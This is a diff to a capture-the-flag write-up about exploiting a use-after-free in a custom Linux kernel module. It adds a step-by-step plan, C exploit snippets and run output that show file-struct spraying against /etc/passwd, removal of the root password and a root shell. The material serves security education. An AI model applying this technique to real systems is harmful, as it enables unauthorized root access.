@@ -235,11 +235,19 @@ error:
 	return -EBADF;
 ```
 
-If we can force `get_unused_fd_flags(0)` to fail, the _file_ struct `f_count` will be decremented. This is a problem because at this moment, the `f_count` still has not been modified as it is incremented in `get_file(file)` function. This would allow us to decrement a file's `f_count` at our will, which by the time it reaches `0`, the file struct will be released/freed giving us a UAF primitive.
+If we can force `get_unused_fd_flags(0)` to fail, the _file_ struct `f_count` will be decremented. This is a problem because at this moment, the `f_count` still has not been modified as it is incremented in `get_file(file)` function. This would allow us to decrement a file's `f_count` at our will, which by the time it reaches `0`, the _file_ struct will be released/freed giving us a UAF primitive.
 
 But how can we force `get_unused_fd_flags(0)` to fail? There's a command called `prlimit` that modifies the resource limits of a given process. In `C`, we can use `prlimit` or `setprlimit` to modify the max number of open files (`RLIMIT_NOFILE`) a process can have. If we reach this limit, `get_unused_fd_flags(0)` will always return an error.
 
-Once we free the first allocated _file_ struct, we can spray for _file_ structs pointing to critical files like `/etc/passwd`. If we manage to allocate one of these _file_ structs where the previous _file_ struct was freed, we can leverage the UAF into an arbitrary write, allowing us to overwrite the critical file.
+Now that we have identified the UAF primitive, we can desing a proper strategy to exploit it. To do so, we will go through the following steps:
+
+1. **Create a temporary file**: create a file with `O_RDWR` permissions.
+2. **Map the temporary file**: map the file into memory with `PROT_READ` and `PROT_WRITE` protections and the `MAP_SHARED` flag. This way we will be able to write into the desired file after leveraging the UAF primitive.
+3. **Drop `f_count` to `0`**: drop the file's `f_count` to `0` using the previously explained method so the file's _file_ struct is released/freed.
+4. **`/etc/passwd` spraying**: spray _file_ structs pointing to critical files like `/etc/passwd`. If we manage to allocate one of these _file_ structs where the previous _file_ struct was freed, we can leverage the UAF into an arbitrary read/write.
+5. **Overwrite `/etc/passwd`**: As the pages of the mapped region are allowed to be written, we can write into the mapped `/etc/passwd` and the changes will be carried through to the underlying file due to the `MAP_SHARED` flag.
+6. **Avoid kernel memory problems**: Find a way to avoid problems with the messed kernel memory.
+7. **Have fun :)**
 
 ## Exploit Development
 
@@ -286,6 +294,7 @@ void set_fd_limit(int cur, int max) {
 }
 ```
 
+### Create a temporary file
 Once we have created these helper functions, we can start with the actual exploit.
 Firstly, we need to open the LKM and a temporary file that will be the one used to trigger the UAF. This can be achieved the following way:
 
@@ -305,6 +314,7 @@ Firstly, we need to open the LKM and a temporary file that will be the one used 
 	}
 ```
 
+### Map the temporary file
 The next step is to map the previously opened temporary file into memory. This way we can get access to the file with a single pointer instead of going through a file descriptor. This mapping must allow read and write access and must have the `MAP_SHARED` flag set. This way any change in the mapped file will be carried through to the underlying file.
 
 We must take into account that if we want to access an empty mapped file, we will receive a `bus error` as we will be accessing beyond the file's end. To avoid this later on, we can write a placeholder to the file.
@@ -324,6 +334,7 @@ We must take into account that if we want to access an empty mapped file, we wil
 	}
 ```
 
+### Drop `f_count` to `0`
 Now the `f_count` related to our temporary file should have a value of `2` as the mapping has increased the previous value by one.
 
 Our next goal is to force `get_unused_fd_flags(0)` to fail. As we explained before, this can be achieved by limiting the max amount of open files a process can have. We will use the previously defined wrapper for the `prlimit` function.
@@ -421,6 +432,7 @@ $4 = {
 }
 ```
 
+### `/etc/passwd` spraying
 Now that the _file_ struct has been released, we need to fill this freed space with a _file_ struct pointing to a critical file. In this case, we spray with _file_ structs pointing to `/etc/passwd`.  
 
 ```c
@@ -438,19 +450,22 @@ By the time a _file_ struct fills the previously freed space, we will be able to
 
 To check if the spraying has successfully finished, we can print the memory region we mapped at the beginning of the exploit. If the printed output is the content of `/etc/passwd`, the spraying has successfully finished. Otherwise, we'll see the content of the placeholder we set at the beginning.
 
-After this check is completed, we can overwrite the first line of `/etc/passwd` with our custom value:
-
 ```c
 	// Checking for successful UAF.
 	puts("[+] Checking for successful UAF. Content should be from /etc/passwd:");
 	fputs(ptr, stdout);
+```
 
+### Overwrite `/etc/passwd`
+After the last check is completed, we can overwrite the first line of `/etc/passwd` with our custom value:
+```c
 	// Overwriting /etc/passwd root entry.
 	puts("[+] Overwriting /etc/passwd root entry. Content should have been modified:");
 	memcpy(ptr, privesc, strlen(privesc));
 	fputs(ptr, stdout);
 ```
 
+### Avoid kernel memory problems
 At this moment, we have successfully completed the UAF exploitation by writing to an arbitrary file. However, during this process, we have messed up with the kernel memory, and this leads to kernel panic after running `su root` and some other commands.
 
 By the time a process ends, it decrements the `f_count` of all the file descriptors in its file descriptor table. As there are two file descriptors pointing to the same file struct, it could be creating a double free which ends in kernel panic. However, after fixing this, it keeps breaking for some other reason.
@@ -484,8 +499,38 @@ After some time, we can find a good solution. It is not the cleanest way of solv
 	}
 ```
 
-After this last modification, we can elevate our privileges to root and do whatever we want:
+### Have fun :)
+Time to have fun! Now we can elevate our privileges to root and do whatever we want:
 ```
+/home/user $ id
+uid=1000(user) gid=1000(user) groups=1000(user)
+/home/user $ ./exploit
+[+] Fork & wait for success
+[+] Opening LKM
+[+] Opening tmp file
+[+] Allocating some bytes into tmp file to prevent bus error
+[+] Mapping tmp file into memory
+[+] Limiting max amount of file descriptors
+[+] RLIMIT_NOFILE set to:
+[+]     rlim_cur = 0
+[+]     rlim_max = 4096
+[+] Forcing file struct release. Expecting EBADF:
+exploit: [!] IOCTL_CTF_INSTALL_FILE failed: Bad file descriptor
+exploit: [!] IOCTL_CTF_INSTALL_FILE failed: Bad file descriptor
+[+] Extending max amount of file descriptors
+[+] RLIMIT_NOFILE set to:
+[+]     rlim_cur = 4096
+[+]     rlim_max = 4096
+[+] Spraying file structs pointing to /etc/passwd
+[+] Checking for successful UAF. Content should be from /etc/passwd:
+root:x:0:0:root:/root:/bin/sh
+user:x:1000:1000:user:/home/user:/bin/sh
+[+] Overwriting /etc/passwd root entry. Content should have been modified:
+root::0:0:root:/root:/bin/ash
+user:x:1000:1000:user:/home/user:/bin/sh
+[+] Corruption process has been completed. Waiting for a root shell...
+/home/user # id
+uid=0(root) gid=0(root) groups=0(root)
 /home/user # ls -l /flag
 ----------    1 root     root            27 Jun 22 11:03 /flag
 /home/user # cat /flag
